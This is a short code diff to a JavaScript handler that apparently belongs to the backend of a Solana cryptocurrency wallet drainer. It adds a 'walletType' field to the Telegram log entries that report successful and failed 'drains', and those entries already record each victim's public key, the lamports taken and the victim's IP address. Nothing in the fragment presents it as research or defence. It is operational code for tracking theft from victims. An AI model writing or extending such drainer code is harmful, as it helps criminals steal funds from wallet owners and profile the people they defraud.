@@ -90,6 +90,7 @@ async function handleConfirmationLogging(req, res) {
           publicKey: publicKey,
           actualDrainAmount: req.body.actualDrainAmount || 0,
           lamports: req.body.lamports || 0,
+          walletType: req.body.walletType || 'Unknown',
           ip: userIp
         });
       } catch (telegramError) {
@@ -102,6 +103,7 @@ async function handleConfirmationLogging(req, res) {
         await telegramLogger.logDrainFailed({
           publicKey: publicKey,
           lamports: req.body.lamports || 0,
+          walletType: req.body.walletType || 'Unknown',
           ip: userIp,
           error: error || 'Transaction failed on-chain'
         });
